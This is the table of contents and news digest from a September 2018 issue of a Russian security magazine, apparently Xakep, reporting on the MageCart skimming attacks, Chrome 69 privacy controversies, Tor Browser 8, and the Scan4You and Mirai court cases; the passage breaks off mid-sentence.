
                                                  Сентябрь 2018
            № 234
CONTENTS

   MEGANEWS
  Всё новое за последний месяц

    Дайджест Android
  Лучшие гайды, библиотеки и инструмен ты месяца

    Как взломать iPhone
  Разбира ем по шагам все вари анты доступа к дан ным устройств с iOS

    Самое крутое с мировых ИБ конферен ций
  Лучшие публикации, посвященные взлому видеоигр

    Безопасность смарт‐контрак тов
  Топ‐10 уязвимостей децен тра лизован ных приложений на примере спецификации DASP

     Private_problem
  Разбира ем слож ное задание на реверс и форен зику с CTFZone 2018

    Наг нуть Nagios
  Разбира ем хит рую цепочку уязвимостей в популяр ной системе монито ринга

    Эхо кибервой ны
  Как NotPetya чуть не потопил крупней шего морского перевозчика грузов

    Пространс тво для эксплуатации
  Как работа ет новая RCE‐уязвимость в Struts 2

    Злой HID
  Делаем и программируем хакерский девайс для HID‐атак

    Загад ка Хешерезады
  Разгадыва ем инте ресный кракми White Rabbit и кача ем скилл реверсинга

    Вам пришло MMS!
  Вскрываем малварь Asacub, которая ворует деньги у пользователей Android

    Разрешено все!
  Изучаем новую крутую технику обхо да CSP

    Пред биллинг
  Разбира емся, как мобильные операто ры хра нят и обра батывают наши данные

    Лазей ка под файрволом
  Тестируем пять популярных средств, которые пробрасыва ют интернет по DNS

    Исполь зуем Ansible для развертывания системы и прог рамм
  Колон ка Ильи Русане на

    Змея в «Твит тере»
  Как вруч ную сделать загрузочный образ с игрой, который уместится в твит

    Правильный Linux
  Про буем NixOS, уникаль ный, стран ный и очень удобный дистрибутив

   WWW
  Интересные веб‐сервисы

    Идеальная форма
  Обрабатываем слож ные фор мы на Python с помощью WTForms

     Pixel 3 ненастоящий
  Колон ка Олега Афонина

     Тит ры
  Кто дела ет этот журнал

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





MAGECART АТАКУЕТ
В сентябре 2018 года стало извес тно о серии масштабных атак на самые
разные орга низации и компании по всему миру. За всеми этими инцидентами
стоит хакерская группа MageCart.
  По данным ИБ‐специалистов, одноименная вредоносная кампания Mage‐
Cart активна как минимум с 2015 года, и в ее рамках действует не одна хакер‐
ская группа, а сразу несколько групп, применя ющих практически одинаковые
тактики. Одну из них специалис ты RiskIQ отслеживают под тем же именем,
MageCart. Именно эта группировка, по мнению специалистов, была ответс‐
твенна за ряд происшествий, о которых стало извес тно в этом месяце.
   «Почерк» MageCart поч ти всег да узнаваем: злоумышленники взламывают
онлайновые магазины и сайты компаний и внедряют код JavaScript на стра‐
ницы оплаты, похищая таким образом вводимые пользователями финан‐
совые данные (номера банковских карт, имена, адреса и так далее). К при‐
меру, недавно была выявлена  такая компромета ция нескольких  тысяч
интернет‐магазинов на платформе Magento.


British Airways
Первой крупной жертвой преступников стали пользователи сайта (ba.com)
и мобильного приложения авиакомпании British Airways. Под угрозой ока‐
зались все пользователи, бронировавшие билеты через официальный сайт
или приложение компании с 25 августа по 5 сентября 2018 года. Суммарно
в руки преступников попали личные и финансовые данные 380 тысяч человек.
  Эксперты RisqIQ рас ска зывают, что обна ружи ли признаки операции Mage‐
Cart. Воспользовавшись своим внутренним инс трументом, который периоди‐
чески архивирует код раз личных сайтов, исследователи нашли JavaScript, заг‐
руженный на сайт British Airways. Файл, который не изменяли с 2012 года,
вдруг был модифицирован 21 августа 2018‐го (в 20:49 GMT), примерно
за два часа до официального начала ата ки, ука занного в пресс‐релизе ави‐
акомпании.
   Хакеры из MageCart внедрили вредонос ный код в конец «чистого» до это‐
го момента файла modernizr‐2.6.2.js. Малварь следила за определенными
движениями мыши и нажатиями и перехватывала данные, введенные в форму
на странице оплаты. Затем эта информа ция переда валась на удаленный сер‐
вер baways.com (89.47.162.248), который расположен в Румынии, а принад‐
лежит литов скому VPS‐провайдеру.
  Данный сервер использовал сертификат Comodo, зарегис трированный
за несколько дней до ата ки. По мнению исследова телей, это указывает на то,
что у атакующих было время для подготовки операции, а значит, на тот
момент они уже име ли дос туп к сайту British Airways. Сей час сертификат
для baways.com уже отоз ван.
  Кроме того, аналитикам RisqIQ уда лось понять, почему компрометация
затронула не только официальный сайт, но и мобильное приложение авиапе‐
ревозчика. Дело в том, что разработчики British Airways написали мобильное
приложение таким образом, что внутри него подгру жался тот же самый пла‐
тежный интерфейс с официального сай та. И когда хакеры внедрили на эту
страницу малварь, атака затронула и пользователей приложе ния.


Feedify
Вскоре после новости о компрометации пользователей British Airways стало
известно еще об одной пос тра давшей компании. Злоумышленники взломали
сервис Feedify, позволя ющий администраторам сайтов встраивать в свои
ресурсы push‐уведомления, интегрируя в код сайтов JavaScript‐библиотеки
Feedify.
  Первым компрометацию заметил ИБ‐специалист, известный в  Twitter
под псевдонимом Placebo. Он сообщил, что один из JavaScript‐файлов ком‐
пании (feedbackembad‐min‐1.0.js) содержит вредоносный код, похищающий
платежные данные пользователей.
   Вскоре находку Placebo подтвердили специалисты компании RisqIQ, а так‐
же известный эксперт Кевин Бомонт (Kevin Beaumont). Хотя на официальном
сайте компании сказано, что продуктом Feedify пользуются более 4000 кли‐
ентов, поиск через PublicWWW позволяет обна ружить только 250–300 сайтов
с зараженной библиотекой. Исследова тели RisqIQ сумели установить, что
компрометация сервиса произошла еще 17 августа 2018 года, в 16:51:01
GMT.
   Placebo  уведомил  раз работчиков   Feedify  о  проблеме  11  сен‐
тября 2018 года, и вредонос ный код практически сра зу был удален из файла.
Однако атакующие не сда лись. Мень ше чем через сутки файл оказался
заражен MageCart снова, а когда представители Feedify повторно удалили
мал варь, преступники иницииро вали заражение в третий раз. При этом пред‐
ставители компании до сих пор хра нят молчание и не отвечают на вопросы
экспертов и СМИ.


Newegg
Третьей жертвой MageCart в сентябре стал крупный ретейлер Newegg. Ком‐
прометацию обнаружили эксперты компаний RiskIQ и Volexity. По данным
исследователей, атака началась еще 13 августа 2018 года, когда преступники
зарегистрировали домен neweggstats.com, максимально близкий  к нас‐
тоящему адресу newegg.com. Этому домену также принад лежал SSL‐сер‐
тификат, выпущен ный Comodo.
  Уже на следующий день зло умышленники, как обычно, встроили на стра‐
ницу оплаты настоящего Newegg малварь, похища ющую данные пользовате‐
лей. Чтобы не привлекать лиш него внимания и не вызывать подозрений, эта
информация передавалась neweggstats.com (217.23.4.11). Как ни странно, так‐
тика преступников сработа ла, компро метацию обнаружили лишь месяц спус‐
тя, 18 сентября 2018 года.
  До сих пор неизвестно, сколько пользователей успели пострадать от этой
атаки, но, по данным SimilarWeb, посещаемость Newegg составляет поряд‐
ка 50 миллионов человек в месяц.
  Представите ли компании уже начали уведомлять пострадавших о случив‐
шемся. В компании порекомендовали пользователям, совершавшим покупки
через Newegg в указанный период, следить за своими банковскими аккаунта‐
ми и сообщать о любой подоз рительной активнос ти.


Воз можная связь с MagBO
Также в этом месяце специалис ты ком пании Flashpoint рассказали об обна‐
ружении русскоязыч ной торговой пло щадки MagBO, на которой торгуют дос‐
тупом к тысячам взло манных сайтов.
  По данным исследова телей, MagBO появился сравнительно недавно (в
первой половине 2018 года) и должен сос тавить конкуренцию таким площад‐
кам, как HackForum, Exploit.in, xDedic, Nulled и Mal4All. Однако от конкурентов
MagBO отличает один немало важный нюанс — на новом форуме продают
web shell’ы для уже скомпрометированных сайтов. То есть на продажу выс‐
тавлен доступ к ресурсам, на которых уже размещены какие‐то бэкдоры, поз‐
воляющие покупателям без тру да проникнуть в систему.
  В настоящее время на про дажу выставлены порядка 3000 скомпромети‐
рованных ресурсов, стоимость доступа варьиру ется от 0,5 до 1000 долларов
США. Причем цены уста навливаются динами чес ки и зависят от таких зна‐
чений, как посещаемость или параметры хостинга. Чем больше посеща‐
емость взломанного ресурса и чем глубже дос туп к его хостинг‐инфраструк‐
туре, тем выше будет цена.
   Хотя пока иссле дователям Flashpoint не уда лось найти неопровержимых
доказательств, связывающих атаки группы MageCart с MagBO, они не исклю‐
чают такой возможности. Так как все перечисленные атаки были «многослой‐
ными», по мнению аналитиков, изна чальной компро метацией пострадавших
сайтов могли заниматься совсем дру гие злоумышленники, у которых опе‐
раторы MageCart затем покупа ли дос туп. Эксперты не исключают, что сделки
могли совершаться напрямую через MagBO.


60 000 000 ДОЛЛАРОВ ПОХИЩЕНО У БИРЖИ ZAIF


Японская криптовалютная биржа Zaif объявила об ограблении. В результате инцидента ком‐
пания и ее пользователи лишились 60 миллионов дол ларов.

Взлом был обнаружен 17 сентября 2018 года. В общей сложности ущерб от действий злоумыш‐
ленников составил 6,7 миллиар да иен (примерно 59,67 мил лиона дол ларов). Атакующим уда‐
лось украсть 5,966 BTC и пока неизвестное количес тво монет Bitcoin Cash и MonaCoin.

Самой бирже при этом принадлежало лишь 32% средств  (2,2 мил лиарда  иен),  тогда
как остальные 4,5 миллиарда принадлежали пользователям ресурса. Представите ли  Zaif
намерены получить заем в размере 5 миллиар дов иен и покрыть ущерб всех пос традавших.





СПОРНЫЕ
НОВОВВЕДЕНИЯ
CHROME 69
В начале сентября 2018 года в свет вышел Chrome 69 с обновленным
интерфейсом и рядом новых функций. На первый взгляд, переработанный
дизайн вкладок, адресной стро ки, стартовой страницы и других элементов
браузера выглядел неплохо, одна ко «под капотом» новой версии обнаружи‐
лось множество нововведений, из‐за которых половина ИБ‐сообщества
обрушилась с жесткой критикой на разработчиков Chrome.


WWW и под домены
С новым релизом разработчики Chrome в очередной раз решили сделать его
интерфейс проще и удобнее, отказавшись от «сложных и ненужных» частей
URL, которые, по их мнению, лишь запутывают пользователей. К при меру,
оказалось, что чтение URL‐адресов усложняют отображающиеся в строке
адреса мобильные поддомены, WWW и про чие элементы. Якобы людям слож‐
но понять, какой именно части адреса нужно доверять и уде лять внимание,
чем, в частности, поль зуются фишеры и другие прес тупни ки.
  В итоге возникла весьма странная ситуация. Так, если пользователь хотел
посетить www.xakep.ru, то в адресной строке отображалось прос то xakep.ru.
То же самое происходило с m.facebook.com, который превращал ся просто
в facebook.com.
  Подобное «упрощение» не понравилось многим само по себе, но спе‐
циалисты также обнаружили множество багов, свя занных с реализацией
новой функциональности. Например, конс трукция subdomain.www.domain.‐
com не должна превращаться в subdomain.domain.com, а http://www.exam‐
ple.www.example.com не должен обра зовывать example.example.com, однако
происходило именно это.
  Иссле дователи приводят множество примеров подобных ошибок. Так,
http://www.pool.ntp.org и http://pool.ntp.org — это два разных адреса, один
из которых должен вести на страницу проекта, тог да как другой выдает ран‐
домный адрес NTP‐сервера.
  В итоге разработчики Google со общили, что решили прислушаться к мне‐
нию сообщества и вернут отображение мобильных поддоменов и WWW
в строку адреса.
  Однако это лишь времен ная мера. Вскоре инженеры Google собираются
доработать свои идеи, избавиться от багов, и с релизом Chrome 70 «ненуж‐
ные» элемен ты все же исчезнут из адресной стро ки. Так, невзирая на критику,
команда разработки продолжает настаивать на исключении WWW из строки
адреса. Мобильные под домены m пока решили оста вить в покое, так как ока‐
залось,  что такие  user‐controlled поддомены при сутс твуют на большом
количестве сайтов.
  Кроме того, разработчики заявили, что пла ниру ют инициировать пуб‐
личную дискуссию стандартизации о переводе поддоменов www и m в разряд
специализированных.
  Многие специалисты отмечают, что Google, как компания, занимающая
огромную долю рын ка, должна была про явить боль шую ответственность, дож‐
даться начала дискуссии о стандартизации (а лучше ее результатов) и лишь
после принимать столь серьезные решения. Другие компании годами ста‐
рались объяснить пользователям раз ницу в именах хостов и правила чтения
URL, а теперь Google собирается попросту перечеркнуть эту работу и лишь
собьет пользователей с толку.


Принудительная авто ризация
Однако изъятие WWW из строки адреса оказалось едва ли не меньшей
из всех проблем. Так, выяс нили, что пос ле релиза Chrome 69 пользовате лей
принудительно авторизуют в браузере, если они вош ли в свой аккаунт Google
или любой другой сервис компании. Для этого бра узер использует механизм
Sync, позволяющий залогиниться в Chrome и опционально загрузить и син‐
хронизировать локальные данные браузера (историю, пароли, закладки и так
далее) с серверами Google.
   Хотя Sync существует давно, рань ше эта функци ональность не была свя‐
зана со входом в аккаунт Google. Это поз воляло использовать Chrome,
залогинившись в учетной записи Google, но никакие данные браузера
при этом не передавались на серверы Google. Нововведение, представ‐
ленное в Chrome 69, выз вало тревогу у простых поль зовате лей и спе циалис‐
тов, так как теперь получается, что Google может связать трафик человека
с конкретным браузером и устройством.
  Специалисты Google пос пешили объяснить в Twitter, что новое исполь‐
зование Sync все же не означает акти вацию синхронизации по умол чанию
(синхронизацию  поль зователю  потребуется  вклю чить  самостоятельно),
и заверили, что добавление новой функциональ ности, напротив, связано
с усилением приватности. Дело в том, что, когда одним компьютером и бра‐
узером пользуются сразу нес колько человек, данные одного пользователя
могут быть ошибочно связаны с Google‐акка унтом дру гого человека.





Тем не менее разработчиков Google все равно рас кри тиковали. Во‐первых,
из‐за того, что поль зователям попросту не оста вили выбора: они не могут
решать, когда залогинить ся в браузер, а Chrome, в сущности, делает это за
них. Во‐вторых, Google никак не предуп режда ла об этом нововведении; мно‐
гие пользователи могут прос то не заметить раз ницы и очень удивятся, обна‐
ружив, что теперь поль зуют ся Sync.
  В частности, с критикой в адрес компании выступил известный крип‐
тограф, ИБ‐эксперт и профессор Университета Джо на Хопкинса Мэтью Грин
(Matthew Green). Он писал, что разработчики Google в целом переработали
интерфейс таким образом, чтобы пользователь не понимал, залогинен ли он,
активна ли синхронизация и какую кнопку нуж но нажать для начала синхро‐
низации. Эксперт считает, что текущие изменения граничат с использовани‐
ем dark patterns — специфических приемов веб‐дизайна, с помощью которых
обманывают пользователей и побуждают их к «нужным» действиям. Так,
в настоящее время поль зователь может передать всю информацию о своем
браузере Google одним кликом, просто по ошиб ке, пытаясь разобраться
в настройках.
  Более того, Грин убежден, что даже сам процесс аутентификации в бра‐
узере уже может давать Google возможность для сбора данных — опять же
без ведома пользователя.
  В ответ на критику Грина в Google пообещали описать сде ланные изме‐
нения более прозрачно, внеся корректировки в Privacy Policy браузе ра. И хотя
эти изменения могут защитить компанию от возможных юри дических проб‐
лем, к сожалению, они никак не изменят сложившейся после выхода Chrome
69 ситуации, а поведение бра узера вряд ли станет понятнее для рядового
пользователя.


«Неудаляемые» куки
В конце месяца специалис ты обратили внимание на еще одну неприятную
особенность Chrome 69. Как оказалось, после команды на удаление всех
файлов cookie в браузере куки для сервисов Google не удаляются, пока поль‐
зователь не разлогинится. Первым внимание к проб леме «неудаляемых» куки
привлек CTO Contentpass Кристофер Тэван (Christoph Tavan).





Он пояснил, что если пользователь выполнил вход в Chrome 69 (напомню, что
это теперь происходит автоматичес ки, стоит только войти в любой сервис
Google), а затем дал браузеру команду стереть все файлы cookie (открыв
chrome://settings/siteData?search=cookies и нажав «Удалить все»), то куки
для сервисов Google удалены не будут. Точнее, бра узер удалит их, но тут же
воссоздаст снова для поддержания авто ризации.
  Догадаться об этой осо бенности поведения Chrome определенно смогут
не все пользователи, хотя, как видно в сообщении Тэвана, браузер предуп‐
реждает, что после очистки куки «выход из учетной записи Google произведен
не будет». Фактически полностью очис тить браузер от данных можно, только
полностью разлогинив шись и повторив операцию уда ления.
   Также исследователь отметил, что очистка данных в браузере (Clear
browsing data → Cookies and other site data) не затрагивает локальное хра‐
нилище, связанное с API localStorage. К сожалению, именно там хранят иден‐
тификаторы рекламные сети и прочие сервисы, «шпионящие» за пользовате‐
лями.


Про межу точ ный итог
В итоге инженеры Google все же решили обра тить вни мание на недовольство
комьюнити, после того как на компанию обрушились претензии экспертов,
СМИ и рядовых пользователей. В блоге Google появилось сообщение,
написанное продакт‐менеджером Chrome Заком Кохом (Zach Koch). Спе‐
циалист  рассказывает,  что  с  релизом  Chrome  70,  запланированным
на середину октября 2018 года, разработчики перес мотрят некоторые изме‐
нения, внесенные в браузер.
   Кох  пишет,  что  все  раскритикованные  новшества были добавлены
в Chrome с благими намерениями, но, получив фидбэк, разработчики решили
откатить изменения и дать пользователям боль ше контроля. В частности,
в новой версии браузера появится опция Allow Chrome sign‐in («Разрешить
вход в Chrome»), с помощью которой можно будет регулировать автомати‐
ческий вход в браузер и его зависимость от авто ризации в других сервисах
Google.





Также будет дорабо тан UI, появятся более понятные инди каторы, которые
помогут пользователям разоб рать ся, когда вход в браузер выполнен и когда
вклю чена или отклю чена син хрониза ция.





Кроме того, Chrome 70 вновь будет уда лять все файлы cookie, не делая
исключений для куки сервисов самой Google.


ЛИНУС ТОРВАЛЬДС ВРЕМЕННО ПРЕКРАТИТ РАЗРАБОТКУ
ЯДРА
Торвальдс объявил, что временно прекратит заниматься разработкой и возьмет небольшую
паузу, чтобы поработать над собственным поведе нием. Дело в том, что Торвальдс пришел
к выводу, что очень часто он ведет себя с другими разработчиками и даже пос торонними людь‐
ми грубо и неп риемлемо.





→«Я нечуткий эмоционально человек, и вряд ли для кого‐то это станет сюрпризом. Уж точно
не для меня самого. Плохо, что из‐за этого я неправиль но понимал людей и годами даже
не осознавал того, насколько невер но я оцениваю ситуацию и какой вклад вно шу в соз дание
непрофессионального климата»,
— Линус Торвальдс





ОБНОВЛЕННЫЙ TOR
BROWSER
Большое обновление в этом месяце получил не толь ко Google Chrome, но и
Tor Browser, наконец‐то перешедший на кодовую базу  Firefox Quantum
и новый Photon UI.
   Tor Browser всегда основывался на кодовой базе Firefox, однако отставал
от своего «прародителя» на пару релизов. И если инженеры Mozilla предста‐
вили Firefox 57 на базе Firefox Quantum еще в ноябре 2017 года, то до Tor
обновление добралось только теперь. Равно как и Firefox, Tor Browser 8
(основанный на Firefox ESR 60) получил новый движок для рендеринга стра‐
ниц, новый WebExtensions API, который для работы с допол нениями применя‐
ют Chrome, Opera,  Vivaldi, Brave и другие Chromium‐браузеры, а также
обновленный интерфейс Photon UI.
  Но если об основных изменениях, сопряженных с переходом на Firefox
Quantum, хорошо известно на примере Firefox, то у Tor Browser есть и собс‐
твенные специфические новшества. Так, разработчики полностью перера‐
ботали и упростили стартовый экран, который пользователи видят сразу пос‐
ле установки и запуска браузера. Кро ме того, был серьезно переработан
механизм request bridge, теперь не понадо бится отправлять email или перехо‐
дить на сайт проекта, достаточно будет прос то решить капчу в самом Tor
Launcher.


                                     Продолжение статьи →
← Начало статьи





   Также нужно отметить, что почти одновременно с релизом Tor Browser 8 раз‐
  работчики Tor Project представили и мобильную версию своего продукта: Tor
   Browser для Android. Приложение уже дос тупно в каталоге Google Play Store,
   хотя в настоящее время остается альфа‐версией.
      Tor Browser для Android должен заменить собой разрабаты вавшийся
  до недавнего времени командой Guardian Project браузер Orfox, который
  теперь «отправлен в отставку». Раз работчики при зывают сооб щес тво помочь
   в тестировании Tor Browser для Android. В настоящее время установка аль‐
  фа‐версии браузера также требует уста новки мобильного прокси‐приложе‐
  ния Orbot, но разработ чики уверяют, что для будущих релизов это уже
  не понадобится.


  Уяз вимость NoScript
  Еще одним поводом для перехода на новую версию браузера может
   стать 0day‐уязвимость, о которой в середине сентября рассказали спе‐
  циалисты известного «брокера уязвимос тей», компании Zerodium. Данные
  о баге были опубликованы прямо в официальном твиттере компании, после
   того как браузер обно вился и уязвимость ста ла менее критичной (а также
  потеряла свою ценность).
     Уязвимость позволяла обойти самый безопасный режим работы допол‐
  нения NoScript, подразумевающий блокировку всего JavaScript‐контента.
  Данное дополнение по умолчанию рас пространяет ся вмес те с Tor Browser
  и позволяет пользователю разрешать или запрещать работу JavaScript, Flash,
   Java, Silverlight. Фактичес ки предложенная специалистами атака позволяет
  выпол нить в Tor Browser 7.x произвольный код, обманув NoScript и блокировку
  скриптов.
     Рассказать об уязвимости публично исследователи решили именно из‐за
  релиза Tor Browser 8.х, который проблеме уже не подвержен. Дело в том, что
  новая версия браузера работает с Firefox Quantum и использует новый API
  для дополнений, а разработ чик NoScript Джорджио Маоне (Georgio Maone)
  еще в конце прошлого года перера ботал свое решение под новый формат.
     После публикации твита Zerodium с Маоне свя залась пресса, и выяс‐
   нилось, что он впер вые услышал о 0day‐баге именно от журналис тов. Раз‐
  работчик пообе щал срочно выпус тить патч и уточнил, что уязвимость рас‐
  пространяется только на NoScript 5 Classic (уяз вимость появилась в версии
   NoScript 5.0.4, вышедшей в мае 2017 года), но не затрагивает NoScript 10
  Quantum или Tor Browser 8. В настоящее время Маоне уже сдержал свое обе‐
  щание,  подготовив  и  опубликовав   патч:  версия   NoScript   Classic
   5.1.8.7 безопасна.
     Глава Zerodium Чауки Бекрар (Chaouki Bekrar), в свою очередь, сообщил
  СМИ, что информация об этой уяз вимос ти и эксплоит для нее были приобре‐
  тены компанией много месяцев назад, в рамках тематической акции (покупка
   эксплоитов для Tor Browser), проведенной еще осенью 2017 года. Также Бек‐
  рар не стал скрывать, что Zerodium давно поделилась этой информацией
  со своими правительственными заказчиками.
    Напомню, что бизнес‐модель Zerodium (из‐за которой компания неод‐
  нократно подвергалась жесткой критике) такова, что компания сохраняет
  информацию о найденных самос тоятельно и куп ленных у третьих лиц 0day
   в тайне, при этом перепродавая их крупным компани ям, правительственным
  организациям и силовым структурам.


  Больше никакой CAPTCHA
  Хорошие новости поступают из ста на раз работчиков Cloudﬂare. В компании
  объявили о создании Cloudﬂare Onion Service, который будет отличать ботов
  и злоумышленников от легитимного Tor‐трафика. Ожидается, что благодаря
  новому сервису пользователям Tor Browser при дется намного реже стал‐
   киваться с CAPTCHA на защищенных Cloudﬂare сай тах.
    До недав него времени пользователям Tor приходилось решать бесконеч‐
  ные Google reCAPTCHA при каждом посещении сайтов, защищенных Cloud‐
   ﬂare. В 2016 году представители Tor Project даже обви няли компанию в том,
   что та саботирует Tor‐трафик, зас тавляя пользователей решать CAPTCHA
  десятки раз подряд. Тог да в Cloudﬂare ответили, что вынуждены идти на такие
  меры, так как 94% Tor‐трафика сос тавляют боты или злоумышленники.
     Тем не менее спустя примерно полгода раз работчики Cloudﬂare предста‐
  вили Challenge Bypass Speciﬁcation и дополнение для Tor Browser, попытав‐
  шись избавить пользователей от бесконечных тестов. Однако данный проект
  не прижился, и ему на смену ста ли внедрять функциональность Opportunistic
   Encryption, представленную осенью 2016 года. В итоге именно Opportunistic
   Encryption использовали для создания Cloudﬂare Onion Service вместе с кас‐
  томными Proxy Protocol хедера ми, HTTP/2 и рядом дру гих инс трументов.
     Теперь представители компании расска зывают, что для ввода Cloudﬂare
  Onion Service в эксплу ата цию от разработчиков Tor потребовалось лишь
  внести небольшие изменения в бинарники Tor. То есть сервис будет работать
   только с новыми Tor Browser 8.0 и Tor Browser для Android. Также сообщается,
   что Cloudﬂare Onion Service бесплатен для всех клиентов Cloudﬂare и вклю‐
   чить его можно, найдя в настройках опцию Onion Routing.


 ИНТЕРНЕТ‐ПИРАТСТВО В РОС СИИ ПРОДОЛЖАЕТ РАС ТИ
   Специалисты Group‐IB изучили рынок интернет‐пиратства и пришли к выводу, что положе ние
   продолжает ухудшаться.

  В 2018 году рост пиратства составил 21% по сравнению с прошлым годом и дос тиг 85 мил‐
   лионов долларов.

   10 миллиардов раз за год пользователи запрашивали в популярных поис ковых системах прос‐
   мотр фильмов и сериалов бес платно.

   Если исходить из суммарной аудитории интернета прошлого года по России (око ло 90 мил‐
   лионов пользователей), на каждого пользовате ля в среднем приходится порядка 110 прос‐
   мотров пиратских копий кинокартин.

   Количество пиратских копий фильмов составило 211 единиц в 2017 году, что более чем в шесть
   раз превышает показатель годом ранее (33 «экранки»).

   Только за первые девять месяцев 2018 года количес тво опубликованных «экранок» уже перева‐
   лило за отметку в 280 копий. Почти каждая кинокартина, вышедшая в 2018 году в прокат, была
   скопирована пиратами и выложена в Сеть.


  Монетизация пиратской деятельности напрямую зависит от объемов рекламного трафика,
   более 75% которого приходится на поисковые сис темы.

   Суммарный объем трафика видеопиратов за 2017 год вырос на 12% и про должает расти.

   Средний заработок пиратов за 1000 прос мотров сос тавляет 3 доллара. Таким образом, сред‐
   немесячный доход с крупных пиратских сайтов может дос тигать 10 000 долларов.

   На создание пиратского ресур са уходит порядка 240 дол ларов, а значит, его окупаемость
   начинается уже с 80 000 просмотров видео.





 SCAN4YOU
 ПОСАДИЛИ, А MIRAI
 НЕТ
  Еще летом 2017 года пра воохранитель ные органы США предъ явили обви‐
  нения двум гражданам Латвии: Руслану Бондарю (Ruslans Bondars) и Юрию
  Мартышеву (Jurijs Martisevs). Их обвиняли в тай ном сговоре с целью совер‐
  шения электронного мошенничес тва, электронном мошенничестве, подстре‐
   кательстве к преступле нию, а также в при чинении вреда компьютерным сис‐
  темам. По данным Министерс тва юстиции США, эти двое много лет управля‐
  ли Scan4You — сервисом для киберпрес тупников, с помощью которого те
  могли проверить свою малварь и  узнать, «видят» ли ее антивирус ные
  решения.
    Подобные сервисы на Западе называют no distribute сканерами. Принцип
   их работы аналогичен легитимному  VirusTotal, с той лишь разницей, что
  нелегальные сканеры не делятся данными с производителями антивирусных
  продуктов и блокируют телемет рию. Такие ресурсы часто используют раз‐
  работчики малвари, что бы убедиться в том, что их пейлоад не вызывает сра‐
  батывания защитных решений и механизмов.
     Согласно данным специалис тов  Trend  Micro,  также опубликованным
   в прошлом году, Бондарь создал Scan4You еще в 2009 году, и его сервис
  быстро стал одним из популярнейших в данной области «рынка».





  Хотя операторы Scan4You запрещали своему детищу информировать анти‐
  вирусные движки о сканах файлов, в 2012 году они допустили ошибку: забыли
  запретить доклады о сканах URL для движка Trend Micro. В итоге спе циалисты
  компании несколь ко лет собира ли данные сканов о репутации URL от Scan4Y‐
  ou и других подоб ных сервисов, что помогало обнаруживать кампании
  по распространению малвари еще до их запус ка. В конечном счете аналити‐
  кам удалось собрать дос таточно информации, что бы передать эти наработки
  ФБР и другим правоох ранитель ным орга нам.
     Согласно обвинитель ному акту, сос тавлен ному сотрудниками Министерс‐
   тва юстиции США, у ресурса было более 30 тысяч клиентов и он был одним
  из крупнейших в своем роде. Известно, что ска нер хостился в Amazon Web
   Services, а оплату администраторы принимали через PayPal, зарегистри‐
  рованный на Мартышева. Это обстоятельство тоже помогло связать Scan4Y‐
  ou с его операто рами.
     Также из документов следует, что злоумышленники выполняли разные
  обязанности. Так, Бон дарь возглавлял «предпри ятие» и занимал ся под‐
  держанием инфраструктуры сканера и техничес кой стороной дела, тогда
   как Мартышев отвечал за техническую поддержку клиентов через ICQ, Skype,
   Jabber и электронную почту. Еще в мае 2018 года суд присяжных признал
  Бондаря виновным. Одна ко приговор оператору Scan4You был вынесен
  лишь 21 сентября 2018 года. Бондаря пригово рили к четырнадцати годам
  тюремного заключения.
    При этом спе циалис ты Trend Micro утверждают, что соз датель Scan4You
  занимался и другой нелегальной деятельностью. Так, по их данным, Бондарь
   также входил в состав группировки Eva Pharmacy, которая в середине нулевых
  была одним из крупнейших игроков в сфере фармацевтического спама. Кро‐
  ме того, исследователи считают, что до создания Scan4You Бондарь имел
  отношение к распространению известных банковских троянов SpyEye и ZeuS.


   Mirai
  Куда больше повезло разработчикам извес тной IoT‐мал вари Mirai. Напомню,
   что в декабре 2017 года на официальном сайте Министерс тва юсти ции США
  была опубликована целая подборка судеб ных документов, согласно которым
  создателями оригинальной версии вредоноса Mirai были три друга: 21‐летний
  Парас Джа (Paras Jha) из Нью‐Джерси, 20‐летний Джозайя Уайт (Josiah White)
  из Пенсильвании и 21‐летний Далтон Норман (Dalton Norman) из Луизианы.
     Из документов стало понятно, что, создавая  Mirai, эта троица вовсе
  не стремилась разработать мощнейшее кибероружие, которое вызвало
  вполне обоснованную тревогу у властей по всему миру. Изначально Mirai
  и ботнет, построенный на базе данной мал вари, пред назначались для обыч‐
  ных DDoS‐атак по найму, к тому же друзья интересо вались бизнесом, свя зан‐
  ным с популярной компьютер ной игрой Minecraft, и хотели «при жать кон‐
  курентов».
    В команде Джа отвечал за инфраструктуру и удаленный контроль малвари,
  Уайт разработал Telnet‐сканер, вошедший в состав вредоноса, а Норман соз‐
  давал новые эксплоиты. Хотя в официальном заявлении американских влас‐
   тей речь шла лишь о 100 тысячах скомпрометированных устройств на тер‐
  ритории США, на деле постра давших IoT‐устройств, конечно, было гораз до
  больше.
      Так, согласно данным ИБ‐исследователей, толь ко за первые 20 часов
  работы Mirai заразил более 65 тысяч девайсов, а в итоге стабильное количес‐
   тво ботов варьировалось между 200 тысяча ми и 300 тысячами. Напомню, что
  самыми громкими инцидентами, связанными с Mirai, стали атака на европей‐
  ского провайдера OVH (мощность атаки составила 1 Тбайт/с) и атака на DNS‐
  провайдера Dyn, из‐за которой во многих стра нах мира с перебоями работа‐
  ли социальные сети, новостные сайты, популярные стриминговые сервисы
  и другие ресурсы.
    В конце 2017 года стало извес тно, что разработчики нашумевшего IoT‐
  вредоноса полностью признали свою вину (оказалось, что оригинальный Mi‐
   rai‐ботнет использовали не только для DDoS‐атак, но и для массового клик‐
  фрода), а также сознались в том, что в 2016 году запаниковали и выложили
   в открытый доступ исходные коды Mirai, пытаясь сбить с толку правоохраните‐
   лей. «Плоды» этого поступка весь мир пожинает до сих пор, так как львиная
  доля IoT‐малвари базируется на этих исходных кодах и эксплуатирует идеи
   Mirai.
     Хотя всем троим авторам Mirai грозили серь езные тюремные сроки,
  Министерство юстиции США обнародовало пресс‐релиз, согласно которому
  Джа, Уайт и Норман с декаб ря прошлого года активно сотрудничают с пра‐
  воохранительными органами, помогая ФБР в воп росах кибербезопасности.
  В официальном заявлении не ска зано, когда именно и с какими слу чаями
  хакеры помогли разоб рать ся спецслужбам, но довольно легко понять, что
   в числе прочего речь идет о DDoS‐атаках Memcached, ликвидации ботнета
   Kelihos и ботнете VPNFilter.
     Благодаря столь активному сот рудничес тву с правоохранительными орга‐
  нами разработчиков Mirai решили «наг радить»: никто из соз дателей IoT‐мал‐
  вари не сядет в тюрьму. Вместо это го Джа, Уайт и Норман получи ли по пять
   лет испытательного сро ка, были пригово рены к 2500 часам исправительных
   работ,  а  также  обязуются  возместить  при чиненные  убытки  в  раз‐
  мере 127 тысяч дол ларов США и доб роволь но  отдать «значительное
  количество» криптовалют, найденных у них в ходе расследования. Кроме
   того, все трое и далее продолжат сотрудни чать с ФБР и консультировать пра‐
